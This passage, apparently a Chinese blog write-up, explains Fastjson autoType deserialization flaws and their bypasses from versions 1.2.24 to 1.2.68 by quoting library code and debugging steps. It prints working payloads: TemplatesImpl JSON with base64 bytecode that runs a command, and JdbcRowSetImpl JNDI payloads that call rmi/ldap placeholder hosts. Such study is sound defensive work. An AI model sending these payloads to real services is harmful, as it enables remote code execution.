JSON.parseObject(json,User.class)\uff0c\u5728\u6307\u5b9aJSON\u65f6\uff0c\u8fd8\u9700\u8981\u6307\u5b9a\u5176\u6240\u5c5e\u7684\u7c7b\uff0c\u663e\u5f97\u4ee3\u7801\u5c31\u5f88\u81c3\u80bf\uff0c\u6240\u4ee5\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528@type(autotype)\u5b57\u7b26\u6bb5\u6765\u4f7f\u5176\u4e0d\u90a3\u4e48\u81c3\u80bf\u3002 \u50cf\u4e0b\u9762\u8fd9\u6837\uff0c\u5728JSON\u901a\u8fc7\u6307\u5b9a@type\u7684\u503c\u6765\u5b9e\u73b0\u5b9a\u4f4d\u67d0\u7c7b\u3002 JSON.parseObject(\"{\\\"@type\\\":\\\"org.example.App$User\\\",\\\"id\\\":\\\"123\\\"}\") \u867d\u8bf4\u8fd9\u4e48\u505a\u5f88\u65b9\u4fbf\uff0c\u4f46\u662f\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u4f1a\u6267\u884c\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u548c\u5c5e\u6027\u76f8\u5173\u7684get\uff0cset\u65b9\u6cd5\u3002 public class App { public static class User{ private String id; User(){ System.out.println(\"User go\"); } public void setId(String ids){ System.out.println(\"setId go\"); this.id=ids; } public String getId(){ System.out.println(\"GetId go\"); return this.id; } } public static void main(String[] args){ System.out.println(JSON.parseObject(\"{\\\"@type\\\":\\\"org.example.App$User\\\",\\\"id\\\":\\\"123\\\"}\")); } } User go setId go GetId go {\"id\":\"123\"} \u6240\u4ee5\u5728\u8fd9\u4e2aJSON\u53cd\u5e8f\u5217\u5316\u63a5\u53e3\u5904\uff0c\u6211\u4eec\u4f20\u5165\u6076\u610f\u7684JSON\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u4efb\u610f\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u4ee5\u53ca\u5c5e\u6027\u76f8\u5173\u7684get\uff0cset\u65b9\u6cd5\u3002 \u5982\u679c\u67d0\u7c7b\u7684\u76f8\u5173\u65b9\u6cd5\u91cc\u6709\u5371\u9669\u7684\u4ee3\u7801\uff08\u5982\u6267\u884c\u67d0\u4e2a\u547d\u4ee4\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u9020\u6076\u610fJSON\u8fbe\u5230RCE\u7684\u4f5c\u7528\u3002 \u53e6\u5916\uff0cJSON.parseObject(\"{\"@type\":\"org.example.App\\$User\",\"id\":\"123\"}\",Feature.SupportNonPublicField) \uff0c\u53ef\u4ee5\u76f4\u63a5\u4e3aprivate\u6210\u5458\u8d4b\u503c\uff08\u4e0d\u52a0Feature.SupportNonPublicField\u662f\u65e0\u6cd5\u5bf9private\u6210\u5458\u8d4b\u503c\u7684\uff09\u3002\u867d\u7136\u4f46\u662f\uff0c\u5373\u4f7f\u662fprivate\u5c5e\u6027\uff0c\u5982\u679c\u5b83\u6709getter\u6216setter\u90a3\u4e48\u5b83\u7684getter\u548csetter\u4f9d\u65e7\u4f1a\u88ab\u8c03\u7528\u3002 demo public static class User{ private String id; User(){ System.out.println(\"User go\"); } } public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); User a = JSON.parseObject(\"{\\\"@type\\\":\\\"com.exp.Main.Main$User\\\",\\\"id\\\":\\\"123\\\"}\",User.class); System.out.println(a.id); User b = JSON.parseObject(\"{\\\"@type\\\":\\\"com.exp.Main.Main$User\\\",\\\"id\\\":\\\"123\\\"}\",User.class,Feature.SupportNonPublicField); System.out.println(b.id); } User go null User go 123 \u5404\u7248\u672c\u590d\u73b0 1.2.24 TemplatesImpl \u662f\u7684\uff0c\u5c31\u662f7U21\u94fe\u91cc\u9762\u7684TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl \u8fd9\u4e2a\u7c7b\u672c\u8eab\u5c31\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u4f1a\u5c06\u6210\u5458\u53d8\u91cf_bytecodes\u7684\u6570\u636e\u4f5c\u4e3a\u7c7b\u7684\u5b57\u8282\u7801\u8fdb\u884cnewInsantce\u64cd\u4f5c\u4ece\u800c\u8c03\u7528\u5176\u6784\u9020\u65b9\u6cd5\u6216static\u5757\u3002\u6545\u53ef\u4ee5fastjson\u4e3a\u5951\u673a\u53bb\u8c03\u7528\u6b64\u7c7b\u3002 \u4f46\u662f\u7531\u4e8e_name \u548c_bytecodes \u662f\u79c1\u6709\u5c5e\u6027\uff0c\u6240\u4ee5\u9700\u8981FASTJSON\u53cd\u5e8f\u5217\u5316\u63a5\u53e3\u6709Feature.SupportNonPublicField\u53c2\u6570\u624d\u80fd\u5b9e\u73b0\uff0c\u5229\u7528\u6761\u4ef6\u5f88\u82db\u523b\uff0c\u4f46\u662f\u6761\u4ef6\u5141\u8bb8\u7684\u8bdd\u5c31\u5f88\u65b9\u4fbf\uff0cpayload\u6253\u8fc7\u53bb\u5c31\u5b8c\u4e8b\u3002 \u201c _tfactory\u8fd9\u4e2a\u5b57\u6bb5\u5728TemplatesImpl\u65e2\u6ca1\u6709get\u65b9\u6cd5\u4e5f\u6ca1\u6709set\u65b9\u6cd5\uff0c\u8fd9\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u8bbe\u7f6e_tfactory\u4e3a{ },fastjson\u4f1a\u8c03\u7528\u5176\u65e0\u53c2\u6784\u9020\u51fd\u6570\u5f97_tfactory\u5bf9\u8c61\uff0c\u8fd9\u6837\u5c31\u89e3\u51b3\u4e86\u67d0\u4e9b\u7248\u672c\u4e2d\u5728defineTransletClasses()\u7528\u5230\u4f1a\u5f15\u7528_tfactory\u5c5e\u6027\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\u3002 \" payload { \"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\" : [\"yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw\"], \"_name\" : \"a\", \"_tfactory\" : {}, \"outputProperties\" : {} } _bytecodes\u7684\u7c7b\u957f\u8fd9\u6837,\u7f16\u8bd1\u751f\u6210Evil.class\uff0c\u5c06\u5b57\u8282\u7801\u8bfb\u51fa\u5e76\u7528base64\u52a0\u5bc6\uff0c\u4f5c\u4e3a_bytecodes import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Evil extends AbstractTranslet{ static { System.err.println(\"Pwned\"); try { String[] cmd = {\"calc\"}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } @Override public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException { // anything } @Override public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException { // anything } } JdbcRowSetImpl com.sun.rowset.JdbcRowSetImpl ,\u901a\u8fc7JNDI\u6ce8\u5165\u6765\u5b9e\u73b0RCE\u3002\u4f46\u9700\u6ce8\u610fJNDI\u6ce8\u5165\u6709JDK\u7248\u672c\u9650\u5236\uff0c\u9ad8\u7248\u672c\u9700\u8981\u8fdb\u884c\u7ed5\u8fc7\u3002 \u6211\u4eec\u7684payload\u4e00\u822c\u957f\u8fd9\u6837 {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi:/ip:port/Exploit\",\"autoCommit\":true} or {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ip:1099/exp\",\"autoCommit\":true} \u628a\u8fd9\u4e2apayload\u6253\u8fc7\u53bb\uff0c\u4f1a\u6267\u884csetAutoCommit()\uff0c\u53c8setAutoCommit()\u6267\u884c\u4e86connct()\u51fd\u6570\uff0c\u5176\u5982\u4e0b\u3002 connect()\u4f1a\u5bf9dataSourceName\u5c5e\u6027\u8fdb\u884c\u4e00\u4e2aInitialContext.lookup(dataSourceName),\u4ece\u800c\u5b9e\u73b0JNDI\u6ce8\u5165\u3002 private Connection connect() throws SQLException { if(this.conn != null) { return this.conn; } else if(this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null && !this.getUsername().equals(\"\")?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null; } } 1.2.25 \u66f4\u65b0\u673a\u5236 1.2.24\u53ca\u4ee5\u524d\u7248\u672c\u5c31\u8ddf\u767d\u7eb8\u4e00\u6837\u968f\u4fbf\u6253\uff0c\u57281.2.25\u5f00\u59cb\u52a0\u5165\u4e86\u9ed1\u767d\u540d\u5355\u673a\u5236 \u6211\u4eec\u7ee7\u7eed\u75281.2.24\u7684payload\uff08\u8fd9\u91cc\u7528TemplatesImpl\u7684payload\uff09\u53bb\u6253\uff0c\u4f1a\u53d1\u73b0\u62a5\u9519autotype\u4e0d\u652f\u6301 \u7a76\u5176\u539f\u56e0\uff0c\u662f\u56e0\u4e3a\u5728com.alibaba.fastjson.parser.ParserConfig \u52a0\u5165\u4e86CheckAutoType\u65b9\u6cd5 com.alibaba.fastjson.parser.ParserConfig !public Class<?> checkAutoType(String typeName, Class<?> expectClass) \u5728\u5176\u4e2d\u6709\u4e2aautotypesupport\u5c5e\u6027\uff0c\u5982\u679c\u4e3afalse\uff0c\u90a3\u4e48\u5c31\u4f1a\u68c0\u6d4bjson\u4e2d@type\u7684\u503c \u5f00\u5934\u662f\u5426\u4e0e\u9ed1\u540d\u5355\u4e2d\u7684\u503c\u4e00\u6837\uff0c\u82e5\u4e00\u6837\u5c31\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5f02\u5e38\uff0c\u7136\u540e\u52a0\u8f7d\u767d\u540d\u5355\u4e2d\u7684\u7c7b if (!autoTypeSupport) { \\\\\u9ed1\u540d\u5355\u68c0\u6d4b\uff0cclassname\u662f\u4f20\u5165\u7c7b\u7684\u5168\u540d\uff0cdenyList\u662f\u9ed1\u540d\u5355 for (int i = 0; i < denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(\"autoType is not support. \" + typeName); } } for (int i = 0; i < acceptList.length; ++i) { String accept = acceptList[i]; if (className.startsWith(accept)) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass != null && expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } return clazz; } } } \u9ed1\u540d\u5355\u957f\u8fd9\u6837 \u82e5autotypesupport\u5f00\u542f\uff0c\u5219\u4f1a\u5148\u767d\u540d\u5355\u52a0\u8f7d\uff0c\u540e\u9ed1\u540d\u5355\u68c0\u6d4b if (autoTypeSupport || expectClass != null) { for (int i = 0; i < acceptList.length; ++i) { String accept = acceptList[i]; if (className.startsWith(accept)) { return TypeUtils.loadClass(typeName, defaultClassLoader); } } for (int i = 0; i < denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(\"autoType is not support. \" + typeName); } } } \u540e\u9762\u7684\u8bb8\u591a\u66f4\u65b0\u90fd\u662f\u5bf9checkAutotype\u4ee5\u53ca\u672c\u8eab\u67d0\u4e9b\u903b\u8f91\u7f3a\u9677\u5bfc\u81f4\u7684\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff0c\u4ee5\u53ca\u9ed1\u540d\u5355\u7684\u4e0d\u65ad\u589e\u52a0\u3002 bypass 1\uff08L;\u6cd5\uff091.2.25-1.2.41 \u5f53autoTypeSupport\u5f00\u542f\u6216expectClass\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u4f1a\u8c03\u7528\u4e00\u4e2aloadclass\u65b9\u6cd5 if (this.autoTypeSupport || expectClass != null) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); } \u800c\u5728\u5176\u4e2d\uff0c\u82e5\u7c7b\u540d\u4ee5L\u5f00\u5934\uff1b\u7ed3\u5c3e\uff0c\u5219\u4f1a\u628a\u8fd9\u4e24\u4e2a\u5b57\u7b26\u53bb\u6389\u5e76\u52a0\u8f7d\u7c7b\u3002 \u201c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f1a\u6709\u8fd9\u79cd\u5947\u602a\u7684\u5904\u7406\uff0cL \u548c ; \u8fd9\u4e00\u5bf9\u5b57\u7b26\u5176\u5b9e\u662f JVM \u5b57\u8282\u7801\u4e2d\u7528\u6765\u8868\u793a\u7c7b\u540d\u7684\uff1a\u201d if (className.startsWith(\"L\") && className.endsWith(\";\")) { String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } \u6240\u4ee5\u5728autotypesupport\u5f00\u542f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765bypass {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://ip:1099\",\"autoCommit\":true} \u5982\u4f55\u5f00\u542fautotypesupport\uff1f\u53ea\u9700\u5728json\u88ab\u89e3\u6790\u524d\u52a0\u5165\u5982\u4e0b\u4ee3\u7801\u5373\u53ef ParserConfig.getGlobalInstance().setAutoTypeSupport(true); bypass 2\uff08json\u5185\u7f6e\uff091.2.25-1.2.47 1.2.25-1.2.32\u7248\u672c\uff1a\u672a\u5f00\u542fAutoTypeSupport\u65f6\u80fd\u6210\u529f\u5229\u7528\uff0c\u5f00\u542fAutoTypeSupport\u53cd\u800c\u4e0d\u80fd\u6210\u529f\u89e6\u53d1\uff1b 1.2.33-1.2.47\u7248\u672c\uff1a\u65e0\u8bba\u662f\u5426\u5f00\u542fAutoTypeSupport\uff0c\u90fd\u80fd\u6210\u529f\u5229\u7528\uff1b { \"a\":{ \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" }, \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true } } 1.2.42 \u66f4\u65b0\u673a\u5236 42\u7248\u672c\u4e2d\u5f00\u53d1\u4eba\u5458\u5c06\u660e\u6587\u9ed1\u540d\u5355\u6539\u6210\u4e86hash\u9ed1\u540d\u5355\uff0c\u5df2\u7ecf\u6709\u4eba\u78b0\u649e\u51fa\u4e86\u4e0d\u5c11\uff0c\u610f\u4e49\u4e0d\u5927\uff1b\u5728\u5904\u740625\u9ed1\u540d\u5355\u7ed5\u8fc7\u7684\u65f6\u5019\u505a\u4e86\u4e00\u4e2a\u6821\u9a8c\uff0c\u5982\u679c\u7c7b\u540d\u4ee5 L \u5f00\u5934\uff0c ; \u7ed3\u5c3e\uff0c\u5219\u4f1a\u7528stubstring\u5904\u7406\u4e00\u4e0b(\u8fd9\u4e2a\u5224\u65ad\u662f\u7531HASH\u6765\u5224\u65ad\u7684\uff0c\u770b\u4e0d\u61c2\uff0c\u4f46\u6211\u5927\u53d7\u9707\u64bc\uff09\uff1a if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) { className = className.substring(1, className.length() - 1); } bypass\uff08\u53cc\u5199\u7ed5\u8fc7\uff09 \u90a3\u4e48\u76f4\u63a5\u4e00\u624b\u53cc\u5199\u7ed5\u8fc7 { \"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://127.0.0.1:2357/Command8\", \"autoCommit\":true } 1.2.42 \u66f4\u65b0\u673a\u5236 \u9488\u5bf9\u53cc\u5199\u7ed5\u8fc7\u5957\u4e86\u4e2a\u5b50\u5224\u65ad\u3002 if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) { if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) { throw new JSONException(\"autoType is not support. \" + typeName); } className = className.substring(1, className.length() - 1); } Bypass TypeUtils.loadClass \u4e2d\u9664\u4e86\u5bf9L;\u8fdb\u884c\u5224\u65ad\uff0c\u8fd8\u6709\u5bf9[\u8fdb\u884c\u4e86\u5224\u65ad } else if (className.charAt(0) == '[') { Class<?> componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } \u56f4\u7ed5\u8fd9\u4e2a\u5c55\u5f00\uff0c\u6784\u9020\u5982\u4e0bpayload\uff0c\u5177\u4f53\u4e3a\u5565\u8fd9\u4e48\u6784\u9020\u6ca1\u6709\u7ec6\u8ddf\uff0c\u53cd\u6b63\u8ddf[\u6709\u5173 { \"@type\" : \"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[,{ \"_bytecodes\" : [\"yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw\"], \"_name\" : \"a\", \"_tfactory\" : {}, \"outputProperties\" : {} } 1.2.44 \u66f4\u65b0\u673a\u5236 44\u7248\u672c\u9488\u5bf943\u7248\u672c\u7684\u7ed5\u8fc7\u4f5c\u4e86\u5904\u7406\uff0c[ \u5f00\u5934\u6216\u8005 L \u5f00\u5934 ; \u7ed3\u5c3e\u90fd\u4f1a\u629b\u51fa\u5f02\u5e38 Bypass JSON\u5185\u7f6e\u5b8c\u7f8e\u51fb\u7834 1.2.47-67 \u66f4\u65b0\u673a\u5236 \u7531\u4e8e47\u4fee\u590d\u4e86JSON\u5185\u7f6e\u7ed5\u8fc7\uff0c\u8fd9\u4e9b\u7248\u672c\u91cc\u4e5f\u6ca1\u5565\u5f88\u597d\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u7f51\u4e0a\u591a\u662f\u4ece\u9ed1\u540d\u5355\u4e2d\u7ed3\u5408JNDI\u6ce8\u5165\u627e\u6f0f\u7f51\u4e4b\u9c7c\uff08\u627e\u5230\u7684\u591a\u4e3a\u7ec4\u4ef6\u7c7b\uff0c\u9700\u8981\u76ee\u6807\u673a\u5668\u4e0a\u6709\u8be5\u7ec4\u4ef6\u624d\u80fd\u6253 https://paper.seebug.org/1155/\uff09\u4ee5\u53caexpectClass\u7ed5\u8fc7AutoType 1.2.68 68\u7248\u672c\u4e4b\u540e\u51fa\u73b0\u4e86\u65b0\u7684\u5b89\u5168\u63a7\u5236\u70b9safeMode\uff0c\u5982\u679c\u5f00\u542f\uff0c\u5728checkAtuoType\u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\uff0c\u53ea\u8981\u8bbe\u7f6e@type\u7c7b\u578b\uff0c\u60f3\u53cd\u5e8f\u5217\u5316\u6307\u5b9a\u7c7b\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u629b\u5f02\u5e38\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f00\u4e86safemod\u7684\u7ad9\u53ef\u4ee5\u4e0d\u7528\u770b\u4e86\u3002 \u5f53\u7136\u8fd9\u4e2a\u7248\u672cexpectClass\u7ed5\u8fc7AutoType\u662f\u53ef\u4ee5\u6253\u4e00\u6253\u7684\u3002 Bypass expectClass\u7ed5\u8fc7AutoType <=1.2.68 \u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2ademo\u5c55\u793a\u4e00\u4e0b. package org.example; import java.io.IOException; public class VulAutoCloseable implements AutoCloseable { public VulAutoCloseable(){ try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public void close() throws Exception { } } \u7136\u540e\u6211\u4eec\u7684payload public class evil { public static void main(String[] args){ System.out.println(JSON.parseObject(\"{\\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\\"@type\\\":\\\"org.example.VulAutoCloseable\\\",\\\"cmd\\\":\\\"calc\\\"}\\n\")); } } \u6267\u884c\u540e\u5f39\u8ba1\u7b97\u5668 \u6211\u4eec\u901a\u8fc7\u8c03\u8bd5\u6765\u770b\u770b\u5177\u4f53\u662f\u600e\u4e48\u4e2a\u56de\u4e8b \u8c03\u8bd5 \u4e8echeckautotype \u5904\u4e0b\u65ad\u70b9\u3002 \u53ef\u4ee5\u53d1\u73b0\u4f20\u5165\u7684typename\u662f AutoCloseable\u3002\u6b64\u65f6\u7684expectClass\u662fNULL \u5f80\u4e0b\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58Mapping\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\u6b64\u7c7b\uff0c \u7136\u540e\u76f4\u63a5\u88abreturn\u4e86\uff0c\u751a\u81f3\u6ca1\u6709\u8d70autoTypeSupport\u6821\u9a8c\u3002 clazz\u88abreturn\u5230\u4e86defaultjsonparser\u91cc\uff0c\u5f80\u4e0b\u770b\u903b\u8f91\u53ef\u4ee5\u53d1\u73b0\u4ece\u5bf9clazz\u8fdb\u884c\u4e86\u4e00\u4e2adeserialze\u65b9\u6cd5\uff0c\u8ddf\u8fdb \u4f1a\u8ddf\u5230\u8fd9\u91cc\u6765 \u5f80\u4e0b\u770b\uff0c\u4f1a\u56e0\u4e3a\u7531Autocloseable\u4e0d\u80fd\u901a\u8fc7getSeeAlso\u65b9\u6cd5\u6210\u529f\u751f\u6210deserializer\u5bf9\u8c61\uff0c\u4ece\u800c\u89e6\u53d1\u7b2c\u4e8c\u8f6echeckAutoType \u7b2c\u4e8c\u8f6e\u4f20\u5165checkAutoType\u7684\u53c2\u6570\u4f9d\u6b21\u4e3a \u7b2c\u4e8c\u4e2a@type\u503c\uff0c\u7b2c\u4e00\u4e2a@type\u503c\uff0c\u548c\u4e00\u4e2a\u4e0d\u91cd\u8981\u7684lexer.getFeatures() \u8fdb\u6765checkAutoType\u540e\uff0c\u4f1a\u5148\u5bf9exceptclass\u8fdb\u884c\u767d\u540d\u5355\u6821\u9a8c\uff0cAutocloseable\u7c7b\u81ea\u7136\u662f\u968f\u4fbf\u8fc7\u6389\uff0c\u7136\u540e\u4f7fexceptClassFlag\u7f6e\u4e3atrue \u968f\u540e\u4fbf\u662f\u4e00\u4e9b\u5bf9typename\u7684\u9ed1\u767d\u540d\u5355\u6821\u9a8c\uff0c\u7531\u4e8etypename\u662forg.example.VulAutoCloseable\uff0c\u4e0d\u5728\u9ed1\u767d\u540d\u5355\u4e2d\uff0c\u6240\u4ee5\u6821\u9a8c\u81ea\u7136\u90fd\u901a\u8fc7\u4e86\u3002 \u4ee5\u4e0b\u662f\u4f9d\u6b21\u7684\u6821\u9a8c\u987a\u5e8f \u9ed1\u540d\u5355\u6821\u9a8c \u5148\u767d\u540e\u9ed1\uff0c\u5176\u4e2d\u6240\u6709\u7684Array.binarySearch\u7ed3\u679c\u90fd\u662f0\uff0c\u81ea\u7136\u5c31\u80fd\u901a\u8fc7IF\u6761\u4ef6 \u5148\u9ed1\u540e\u767d \u51b2\u7834\u91cd\u91cd\u8003\u7814\uff0ctypename\u6307\u5b9a\u7c7b\u88ab\u4f20\u5165TypeUtils.loadClass,\u8ddf\u8fdb 